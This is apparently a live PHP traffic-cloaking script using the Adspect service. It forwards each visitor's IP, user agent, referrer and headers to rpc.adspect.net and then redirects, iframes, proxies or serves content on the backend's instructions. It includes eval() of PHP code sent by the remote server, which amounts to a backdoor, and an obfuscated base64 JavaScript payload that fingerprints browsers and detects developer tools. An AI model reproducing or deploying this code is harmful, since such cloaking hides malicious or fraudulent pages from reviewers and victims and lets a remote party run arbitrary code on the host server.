<?php
 ini_set('display_errors', '0'); error_reporting(E_ALL); if (!function_exists('adspect')) { function adspect_exit($code, $message) { http_response_code($code); exit($message); } function adspect_dig($array, $key, $default = '') { return array_key_exists($key, $array) ? $array[$key] : $default; } function adspect_resolve_path($path) { if ($path[0] === DIRECTORY_SEPARATOR) { $path = adspect_dig($_SERVER, 'DOCUMENT_ROOT', __DIR__) . $path; } else { $path = __DIR__ . DIRECTORY_SEPARATOR . $path; } return realpath($path); } function adspect_spoof_request($url) { $_SERVER['REQUEST_METHOD'] = 'GET'; $_POST = []; $query = parse_url($url, PHP_URL_QUERY); if (is_string($query)) { parse_str($query, $_GET); $_SERVER['QUERY_STRING'] = $query; } } function adspect_try_files() { foreach (func_get_args() as $path) { if (is_file($path)) { if (!is_readable($path)) { adspect_exit(403, 'Permission denied'); } switch (strtolower(pathinfo($path, PATHINFO_EXTENSION))) { case 'php': case 'html': case 'htm': case 'phtml': case 'php5': case 'php4': case 'php3': adspect_execute($path); exit; default: header('Content-Type: ' . adspect_content_type($path)); header('Content-Length: ' . filesize($path)); readfile($path); exit; } } } adspect_exit(404, 'File not found'); } function adspect_execute() { global $_adspect; require_once func_get_arg(0); } function adspect_content_type($path) { if (function_exists('mime_content_type')) { $type = mime_content_type($path); if (is_string($type)) { return $type; } } return 'application/octet-stream'; } function adspect_serve_local($url) { $path = (string)parse_url($url, PHP_URL_PATH); if ($path === '') { return null; } $path = adspect_resolve_path($path); if (is_string($path)) { adspect_spoof_request($url); if (is_dir($path)) { chdir($path); adspect_try_files('index.php', 'index.html', 'index.htm'); return; } chdir(dirname($path)); adspect_try_files($path); return; } adspect_exit(404, 'File not found'); } function adspect_tokenize($str, $sep) { $toks = []; $tok = strtok($str, $sep); while ($tok !== false) { $toks[] = $tok; $tok = strtok($sep); } return $toks; } function adspect_x_forwarded_for() { if (array_key_exists('HTTP_X_FORWARDED_FOR', $_SERVER)) { $xff = adspect_tokenize($_SERVER['HTTP_X_FORWARDED_FOR'], ', '); } elseif (array_key_exists('HTTP_CF_CONNECTING_IP', $_SERVER)) { $xff = [$_SERVER['HTTP_CF_CONNECTING_IP']]; } elseif (array_key_exists('HTTP_X_REAL_IP', $_SERVER)) { $xff = [$_SERVER['HTTP_X_REAL_IP']]; } else { $xff = []; } if (array_key_exists('REMOTE_ADDR', $_SERVER)) { $xff[] = $_SERVER['REMOTE_ADDR']; } return array_unique($xff); } function adspect_headers() { $headers = []; foreach ($_SERVER as $key => $value) { if (!strncmp('HTTP_', $key, 5)) { $header = strtr(strtolower(substr($key, 5)), '_', '-'); $headers[$header] = $value; } } return $headers; } function adspect_crypt($in, $key) { $il = strlen($in); $kl = strlen($key); $out = ''; for ($i = 0; $i < $il; ++$i) { $out .= chr(ord($in[$i]) ^ ord($key[$i % $kl])); } return $out; } function adspect_proxy_headers() { $headers = []; foreach (func_get_args() as $key) { if (array_key_exists($key, $_SERVER)) { $header = strtr(strtolower(substr($key, 5)), '_', '-'); $headers[] = "{$header}: {$_SERVER[$key]}"; } } return $headers; } function adspect_proxy($url, $xff, $param = null, $key = null) { $url = parse_url($url); if (empty($url)) { adspect_exit(500, 'Invalid proxy URL'); } extract($url); $curl = curl_init(); curl_setopt($curl, CURLOPT_FORBID_REUSE, true); curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 60); curl_setopt($curl, CURLOPT_TIMEOUT, 60); curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($curl, CURLOPT_ENCODING , ''); curl_setopt($curl, CURLOPT_USERAGENT, adspect_dig($_SERVER, 'HTTP_USER_AGENT', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36')); curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); if (!isset($scheme)) { $scheme = 'http'; } if (!isset($host)) { $host = adspect_dig($_SERVER, 'HTTP_HOST', 'localhost'); } if (isset($user, $pass)) { curl_setopt($curl, CURLOPT_USERPWD, "$user:$pass"); $host = "$user:$pass@$host"; } if (isset($port)) { curl_setopt($curl, CURLOPT_PORT, $port); $host = "$host:$port"; } $origin = "$scheme://$host"; if (!isset($path)) { $path = '/'; } if ($path[0] !== '/') { $path = "/$path"; } $url = $path; if (isset($query)) { $url .= "?$query"; } curl_setopt($curl, CURLOPT_URL, $origin . $url); $headers = adspect_proxy_headers('HTTP_ACCEPT', 'HTTP_ACCEPT_ENCODING', 'HTTP_ACCEPT_LANGUAGE', 'HTTP_COOKIE'); if ($xff !== '') { $headers[] = "X-Forwarded-For: {$xff}"; } if (!empty($headers)) { curl_setopt($curl, CURLOPT_HTTPHEADER, $headers); } $data = curl_exec($curl); if ($errno = curl_errno($curl)) { adspect_exit(500, 'curl error: ' . curl_strerror($errno)); } $code = curl_getinfo($curl, CURLINFO_HTTP_CODE); $type = curl_getinfo($curl, CURLINFO_CONTENT_TYPE); curl_close($curl); http_response_code($code); if (is_string($data)) { if (isset($param, $key) && preg_match('{^text/(?:html|css)}i', $type)) { $base = $path; if ($base[-1] !== '/') { $base = dirname($base); } $base = rtrim($base, '/'); $rw = function ($m) use ($origin, $base, $param, $key) { list($repl, $what, $url) = $m; $url = parse_url($url); if (!empty($url)) { extract($url); if (isset($host)) { if (!isset($scheme)) { $scheme = 'http'; } $host = "$scheme://$host"; if (isset($user, $pass)) { $host = "$user:$pass@$host"; } if (isset($port)) { $host = "$host:$port"; } } else { $host = $origin; } if (!isset($path)) { $path = ''; } if (!strlen($path) || $path[0] !== '/') { $path = "$base/$path"; } if (!isset($query)) { $query = ''; } $host = base64_encode(adspect_crypt($host, $key)); parse_str($query, $query); $query[$param] = "$path#$host"; $repl = '?' . http_build_query($query); if (isset($fragment)) { $repl .= "#$fragment"; } if ($what[-1] === '=') { $repl = "\"$repl\""; } $repl = $what . $repl; } return $repl; }; $re = '{(href=|src=|url\()["\']?((?:https?:|(?!#|[[:alnum:]]+:))[^"\'[:space:]>)]+)["\']?}i'; $data = preg_replace_callback($re, $rw, $data); } } else { $data = ''; } header("Content-Type: $type"); header('Content-Length: ' . strlen($data)); echo $data; } function adspect($sid, $mode, $param, $key) { if (!function_exists('curl_init')) { adspect_exit(500, 'curl extension is missing'); } $xff = adspect_x_forwarded_for(); $addr = adspect_dig($xff, 0); $xff = implode(', ', $xff); if (array_key_exists($param, $_GET) && strpos($_GET[$param], '#') !== false) { list($url, $host) = explode('#', $_GET[$param], 2); $host = adspect_crypt(base64_decode($host), $key); unset($_GET[$param]); $query = http_build_query($_GET); $url = "$host$url?$query"; adspect_proxy($url, $xff, $param, $key); exit; } $ajax = intval($mode === 'ajax'); $curl = curl_init(); $sid = adspect_dig($_GET, '__sid', $sid); $ua = adspect_dig($_SERVER, 'HTTP_USER_AGENT'); $referrer = adspect_dig($_SERVER, 'HTTP_REFERER'); $query = http_build_query($_GET); if ($_SERVER['REQUEST_METHOD'] == 'POST') { $payload = json_decode($_POST['data'], true); $payload['headers'] = adspect_headers(); curl_setopt($curl, CURLOPT_POST, true); curl_setopt($curl, CURLOPT_POSTFIELDS, json_encode($payload)); } if ($ajax) { header('Access-Control-Allow-Origin: *'); $cid = adspect_dig($_SERVER, 'HTTP_X_REQUEST_ID'); } else { $cid = adspect_dig($_COOKIE, '_cid'); } curl_setopt($curl, CURLOPT_FORBID_REUSE, true); curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 60); curl_setopt($curl, CURLOPT_TIMEOUT, 60); curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($curl, CURLOPT_ENCODING , ''); curl_setopt($curl, CURLOPT_HTTPHEADER, [ 'Accept: application/json', "X-Forwarded-For: {$xff}", "X-Forwarded-Host: {$_SERVER['HTTP_HOST']}", "X-Request-ID: {$cid}", "Adspect-IP: {$addr}", "Adspect-UA: {$ua}", "Adspect-JS: {$ajax}", "Adspect-Referrer: {$referrer}", ]); curl_setopt($curl, CURLOPT_URL, "https://rpc.adspect.net/v2/{$sid}?{$query}"); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); $json = curl_exec($curl); if ($errno = curl_errno($curl)) { adspect_exit(500, 'curl error: ' . curl_strerror($errno)); } $code = curl_getinfo($curl, CURLINFO_HTTP_CODE); curl_close($curl); header('Cache-Control: no-store'); switch ($code) { case 200: case 202: $data = json_decode($json, true); if (!is_array($data)) { adspect_exit(500, 'Invalid backend response'); } global $_adspect; $_adspect = $data; extract($data); if ($ajax) { switch ($action) { case 'php': ob_start(); eval($target); $data['target'] = ob_get_clean(); $json = json_encode($data); break; } if ($_SERVER['REQUEST_METHOD'] === 'POST') { header('Content-Type: application/json'); echo $json; } else { header('Content-Type: application/javascript'); echo "window._adata={$json};"; return $target; } } else { if ($js) { setcookie('_cid', $cid, time() + 60); return $target; } switch ($action) { case 'local': return adspect_serve_local($target); case 'noop': adspect_spoof_request($target); return null; case '301': case '302': case '303': header("Location: {$target}", true, (int)$action); break; case 'xar': header("X-Accel-Redirect: {$target}"); break; case 'xsf': header("X-Sendfile: {$target}"); break; case 'refresh': header("Refresh: 0; url={$target}"); break; case 'meta': $target = htmlspecialchars($target); echo "<!DOCTYPE html><head><meta http-equiv=\"refresh\" content=\"0; url={$target}\"></head>"; break; case 'iframe': $target = htmlspecialchars($target); echo "<!DOCTYPE html><iframe src=\"{$target}\" style=\"width:100%;height:100%;position:absolute;top:0;left:0;z-index:999999;border:none;\"></iframe>"; break; case 'proxy': adspect_proxy($target, $xff, $param, $key); break; case 'fetch': adspect_proxy($target, $xff); break; case 'return': if (is_numeric($target)) { http_response_code((int)$target); } else { adspect_exit(500, 'Non-numeric status code'); } break; case 'php': eval($target); break; case 'js': $target = htmlspecialchars(base64_encode($target)); echo "<!DOCTYPE html><body><script src=\"data:text/javascript;base64,{$target}\"></script></body>"; break; } } exit; case 404: adspect_exit(404, 'Stream not found'); default: adspect_exit($code, 'Backend response code ' . $code); } } } $target = adspect('d37ee92b-5e72-4ff6-a7e9-f6fa250a4a38', 'redirect', '_', base64_decode('p1Sf6l/KsnYmgdQNFKxV2G1Hg+Z5HJU0gegoFP3f9XM=')); if (!isset($target)) { return; } ?>
<!DOCTYPE html>
<html>
<head>
	<meta http-equiv="refresh" content="10; url=<?= htmlspecialchars($target) ?>">
	<meta name="referrer" content="no-referrer">
</head>
<body>
	<script src="data:text/javascript;base64,dmFyIF8weGYwNzE9WycyNDgxNzF3dGFORnAnLCc5NTE4NjJZRUd2ZXknLCdib2R5Jywnc3VibWl0JywnY29uc29sZScsJ3Rvc3RyaW5nJywnZ2V0Q29udGV4dCcsJ3RvU3RyaW5nJywnV0VCR0xfZGVidWdfcmVuZGVyZXJfaW5mbycsJ2Nsb3N1cmUnLCd0aGVuJywnVG91Y2hFdmVudCcsJ2NyZWF0ZUV2ZW50JywndmFsdWUnLCdub3RpZmljYXRpb25zJywnd2ViZ2wnLCdoaWRkZW4nLCc2MjcxNjlVdEx6UmsnLCdsb2cnLCdOb3RpZmljYXRpb24nLCdpbnB1dCcsJ3N0cmluZ2lmeScsJ3B1c2gnLCduYW1lJywnbWV0aG9kJywnc2NyZWVuJywnNzQ3Mzc0dVhoenlkJywnZm9ybScsJ2RvY3VtZW50JywnYWN0aW9uJywncXVlcnknLCdub2RlVmFsdWUnLCdjYW52YXMnLCdnZXRPd25Qcm9wZXJ0eU5hbWVzJywnMTcxNTFKZ2ZVdWwnLCczNDc2NTFDZEFRdW4nLCdnZXRUaW1lem9uZU9mZnNldCcsJzNGR2VmZE8nLCdkb2N1bWVudEVsZW1lbnQnLCd0eXBlJywnZXJyb3JzJywnaHJlZicsJ1VOTUFTS0VEX1JFTkRFUkVSX1dFQkdMJywnZ2V0UGFyYW1ldGVyJywnZGF0YScsJzNyRkhwRE0nLCcxS0dIZkplJywnc3RhdGUnLCczMDIzODEybUpxVlllJywnZnVuY3Rpb24nLCdjcmVhdGVFbGVtZW50JywnbG9jYXRpb24nLCdwZXJtaXNzaW9ucycsJ3Blcm1pc3Npb24nLCdtZXNzYWdlJywnYXBwZW5kQ2hpbGQnLCdVTk1BU0tFRF9WRU5ET1JfV0VCR0wnLCd0b3VjaEV2ZW50Jywnb2JqZWN0JywnbmF2aWdhdG9yJ107dmFyIF8weDU2MTk9ZnVuY3Rpb24oXzB4NGI4YTNhLF8weDJjOGFjMSl7XzB4NGI4YTNhPV8weDRiOGEzYS0weGYyO3ZhciBfMHhmMDcxMzE9XzB4ZjA3MVtfMHg0YjhhM2FdO3JldHVybiBfMHhmMDcxMzE7fTsoZnVuY3Rpb24oXzB4NDA2YTEwLF8weDM0ZjJiNSl7dmFyIF8weDU1YjJlYj1fMHg1NjE5O3doaWxlKCEhW10pe3RyeXt2YXIgXzB4MzA5ZDc0PS1wYXJzZUludChfMHg1NWIyZWIoMHgxMTgpKStwYXJzZUludChfMHg1NWIyZWIoMHgxMDgpKSpwYXJzZUludChfMHg1NWIyZWIoMHhmZCkpK3BhcnNlSW50KF8weDU1YjJlYigweDEyOCkpKy1wYXJzZUludChfMHg1NWIyZWIoMHhmZSkpKnBhcnNlSW50KF8weDU1YjJlYigweDEwMCkpK3BhcnNlSW50KF8weDU1YjJlYigweGY1KSkqLXBhcnNlSW50KF8weDU1YjJlYigweDEwOSkpKy1wYXJzZUludChfMHg1NWIyZWIoMHgxMTcpKStwYXJzZUludChfMHg1NWIyZWIoMHgxMGIpKTtpZihfMHgzMDlkNzQ9PT1fMHgzNGYyYjUpYnJlYWs7ZWxzZSBfMHg0MDZhMTBbJ3B1c2gnXShfMHg0MDZhMTBbJ3NoaWZ0J10oKSk7fWNhdGNoKF8weDFlYmI3Zil7XzB4NDA2YTEwWydwdXNoJ10oXzB4NDA2YTEwWydzaGlmdCddKCkpO319fShfMHhmMDcxLDB4YWRkOGEpLGZ1bmN0aW9uKCl7dmFyIF8weDNjMWM0Yz1fMHg1NjE5O2Z1bmN0aW9uIF8weDVjOWY2Nigpe3ZhciBfMHgxMGM4ZTI9XzB4NTYxOTtfMHgzOTE0NzNbXzB4MTBjOGUyKDB4MTAzKV09XzB4NGVkOGFlO3ZhciBfMHgzNjBmMmE9ZG9jdW1lbnRbJ2NyZWF0ZUVsZW1lbnQnXShfMHgxMGM4ZTIoMHhmNikpLF8weDI2NTRhNj1kb2N1bWVudFsnY3JlYXRlRWxlbWVudCddKF8weDEwYzhlMigweDEyYikpO18weDM2MGYyYVtfMHgxMGM4ZTIoMHhmMyldPSdQT1NUJyxfMHgzNjBmMmFbXzB4MTBjOGUyKDB4ZjgpXT13aW5kb3dbXzB4MTBjOGUyKDB4MTBlKV1bXzB4MTBjOGUyKDB4MTA0KV0sXzB4MjY1NGE2W18weDEwYzhlMigweDEwMildPV8weDEwYzhlMigweDEyNyksXzB4MjY1NGE2W18weDEwYzhlMigweGYyKV09XzB4MTBjOGUyKDB4MTA3KSxfMHgyNjU0YTZbXzB4MTBjOGUyKDB4MTI0KV09SlNPTltfMHgxMGM4ZTIoMHgxMmMpXShfMHgzOTE0NzMpLF8weDM2MGYyYVtfMHgxMGM4ZTIoMHgxMTIpXShfMHgyNjU0YTYpLGRvY3VtZW50W18weDEwYzhlMigweDExOSldWydhcHBlbmRDaGlsZCddKF8weDM2MGYyYSksXzB4MzYwZjJhW18weDEwYzhlMigweDExYSldKCk7fXZhciBfMHg0ZWQ4YWU9W10sXzB4MzkxNDczPXt9O3RyeXt2YXIgXzB4MjRhZTBmPWZ1bmN0aW9uKF8weDNkMWFhNSl7dmFyIF8weDVjMjgzMD1fMHg1NjE5O2lmKF8weDVjMjgzMCgweDExNSk9PT10eXBlb2YgXzB4M2QxYWE1JiZudWxsIT09XzB4M2QxYWE1KXt2YXIgXzB4NWNmNTZlPWZ1bmN0aW9uKF8weDMxYTVmMil7dmFyIF8weDQ4MzVlMT1fMHg1YzI4MzA7dHJ5e3ZhciBfMHg0N2ZjNzQ9XzB4M2QxYWE1W18weDMxYTVmMl07c3dpdGNoKHR5cGVvZiBfMHg0N2ZjNzQpe2Nhc2UgXzB4NDgzNWUxKDB4MTE1KTppZihudWxsPT09XzB4NDdmYzc0KWJyZWFrO2Nhc2UgXzB4NDgzNWUxKDB4MTBjKTpfMHg0N2ZjNzQ9XzB4NDdmYzc0Wyd0b1N0cmluZyddKCk7fV8weDVjZThiZFtfMHgzMWE1ZjJdPV8weDQ3ZmM3NDt9Y2F0Y2goXzB4MjE1ZTgyKXtfMHg0ZWQ4YWVbXzB4NDgzNWUxKDB4MTJkKV0oXzB4MjE1ZTgyW18weDQ4MzVlMSgweDExMSldKTt9fSxfMHg1Y2U4YmQ9e30sXzB4MzhjOTBmO2ZvcihfMHgzOGM5MGYgaW4gXzB4M2QxYWE1KV8weDVjZjU2ZShfMHgzOGM5MGYpO3RyeXt2YXIgXzB4NTkwYTc3PU9iamVjdFtfMHg1YzI4MzAoMHhmYyldKF8weDNkMWFhNSk7Zm9yKF8weDM4YzkwZj0weDA7XzB4MzhjOTBmPF8weDU5MGE3N1snbGVuZ3RoJ107KytfMHgzOGM5MGYpXzB4NWNmNTZlKF8weDU5MGE3N1tfMHgzOGM5MGZdKTtfMHg1Y2U4YmRbJyEhJ109XzB4NTkwYTc3O31jYXRjaChfMHg3ZDFjZGEpe18weDRlZDhhZVtfMHg1YzI4MzAoMHgxMmQpXShfMHg3ZDFjZGFbXzB4NWMyODMwKDB4MTExKV0pO31yZXR1cm4gXzB4NWNlOGJkO319O18weDM5MTQ3M1snc2NyZWVuJ109XzB4MjRhZTBmKHdpbmRvd1tfMHgzYzFjNGMoMHhmNCldKSxfMHgzOTE0NzNbJ3dpbmRvdyddPV8weDI0YWUwZih3aW5kb3cpLF8weDM5MTQ3M1snbmF2aWdhdG9yJ109XzB4MjRhZTBmKHdpbmRvd1tfMHgzYzFjNGMoMHgxMTYpXSksXzB4MzkxNDczW18weDNjMWM0YygweDEwZSldPV8weDI0YWUwZih3aW5kb3dbXzB4M2MxYzRjKDB4MTBlKV0pLF8weDM5MTQ3M1tfMHgzYzFjNGMoMHgxMWIpXT1fMHgyNGFlMGYod2luZG93W18weDNjMWM0YygweDExYildKSxfMHgzOTE0NzNbXzB4M2MxYzRjKDB4MTAxKV09ZnVuY3Rpb24oXzB4MzM2MDRmKXt2YXIgXzB4M2JhZDljPV8weDNjMWM0Yzt0cnl7dmFyIF8weDM0YjU3Nj17fTtfMHgzMzYwNGY9XzB4MzM2MDRmWydhdHRyaWJ1dGVzJ107Zm9yKHZhciBfMHgzZGFlNGMgaW4gXzB4MzM2MDRmKV8weDNkYWU0Yz1fMHgzMzYwNGZbXzB4M2RhZTRjXSxfMHgzNGI1NzZbXzB4M2RhZTRjWydub2RlTmFtZSddXT1fMHgzZGFlNGNbXzB4M2JhZDljKDB4ZmEpXTtyZXR1cm4gXzB4MzRiNTc2O31jYXRjaChfMHgxOGU1MGEpe18weDRlZDhhZVtfMHgzYmFkOWMoMHgxMmQpXShfMHgxOGU1MGFbXzB4M2JhZDljKDB4MTExKV0pO319KGRvY3VtZW50W18weDNjMWM0YygweDEwMSldKSxfMHgzOTE0NzNbXzB4M2MxYzRjKDB4ZjcpXT1fMHgyNGFlMGYoZG9jdW1lbnQpO3RyeXtfMHgzOTE0NzNbJ3RpbWV6b25lT2Zmc2V0J109bmV3IERhdGUoKVtfMHgzYzFjNGMoMHhmZildKCk7fWNhdGNoKF8weDI4M2QyOCl7XzB4NGVkOGFlW18weDNjMWM0YygweDEyZCldKF8weDI4M2QyOFsnbWVzc2FnZSddKTt9dHJ5e18weDM5MTQ3M1tfMHgzYzFjNGMoMHgxMjApXT1mdW5jdGlvbigpe31bXzB4M2MxYzRjKDB4MTFlKV0oKTt9Y2F0Y2goXzB4NGIzMjFlKXtfMHg0ZWQ4YWVbXzB4M2MxYzRjKDB4MTJkKV0oXzB4NGIzMjFlW18weDNjMWM0YygweDExMSldKTt9dHJ5e18weDM5MTQ3M1tfMHgzYzFjNGMoMHgxMTQpXT1kb2N1bWVudFtfMHgzYzFjNGMoMHgxMjMpXShfMHgzYzFjNGMoMHgxMjIpKVtfMHgzYzFjNGMoMHgxMWUpXSgpO31jYXRjaChfMHgyZTUzMjIpe18weDRlZDhhZVsncHVzaCddKF8weDJlNTMyMlsnbWVzc2FnZSddKTt9dHJ5e18weDI0YWUwZj1mdW5jdGlvbigpe307dmFyIF8weDJhMmI0MT0weDA7XzB4MjRhZTBmW18weDNjMWM0YygweDExZSldPWZ1bmN0aW9uKCl7cmV0dXJuKytfMHgyYTJiNDEsJyc7fSxjb25zb2xlW18weDNjMWM0YygweDEyOSldKF8weDI0YWUwZiksXzB4MzkxNDczW18weDNjMWM0YygweDExYyldPV8weDJhMmI0MTt9Y2F0Y2goXzB4NWQ2ZDIwKXtfMHg0ZWQ4YWVbJ3B1c2gnXShfMHg1ZDZkMjBbJ21lc3NhZ2UnXSk7fXdpbmRvd1tfMHgzYzFjNGMoMHgxMTYpXVtfMHgzYzFjNGMoMHgxMGYpXVtfMHgzYzFjNGMoMHhmOSldKHsnbmFtZSc6XzB4M2MxYzRjKDB4MTI1KX0pW18weDNjMWM0YygweDEyMSldKGZ1bmN0aW9uKF8weDc4YWNmNil7dmFyIF8weDIxYmMwOT1fMHgzYzFjNGM7XzB4MzkxNDczW18weDIxYmMwOSgweDEwZildPVt3aW5kb3dbXzB4MjFiYzA5KDB4MTJhKV1bXzB4MjFiYzA5KDB4MTEwKV0sXzB4NzhhY2Y2W18weDIxYmMwOSgweDEwYSldXSxfMHg1YzlmNjYoKTt9LF8weDVjOWY2Nik7dHJ5e3ZhciBfMHgzNzUxYWY9ZG9jdW1lbnRbXzB4M2MxYzRjKDB4MTBkKV0oXzB4M2MxYzRjKDB4ZmIpKVtfMHgzYzFjNGMoMHgxMWQpXShfMHgzYzFjNGMoMHgxMjYpKSxfMHgzNzNhM2Q9XzB4Mzc1MWFmWydnZXRFeHRlbnNpb24nXShfMHgzYzFjNGMoMHgxMWYpKTtfMHgzOTE0NzNbXzB4M2MxYzRjKDB4MTI2KV09eyd2ZW5kb3InOl8weDM3NTFhZltfMHgzYzFjNGMoMHgxMDYpXShfMHgzNzNhM2RbXzB4M2MxYzRjKDB4MTEzKV0pLCdyZW5kZXJlcic6XzB4Mzc1MWFmW18weDNjMWM0YygweDEwNildKF8weDM3M2EzZFtfMHgzYzFjNGMoMHgxMDUpXSl9O31jYXRjaChfMHgxOTY0MDIpe18weDRlZDhhZVsncHVzaCddKF8weDE5NjQwMlsnbWVzc2FnZSddKTt9fWNhdGNoKF8weDQyNmM0OSl7XzB4NGVkOGFlW18weDNjMWM0YygweDEyZCldKF8weDQyNmM0OVtfMHgzYzFjNGMoMHgxMTEpXSksXzB4NWM5ZjY2KCk7fX0oKSk7"></script>
</body>
</html>
<?php exit;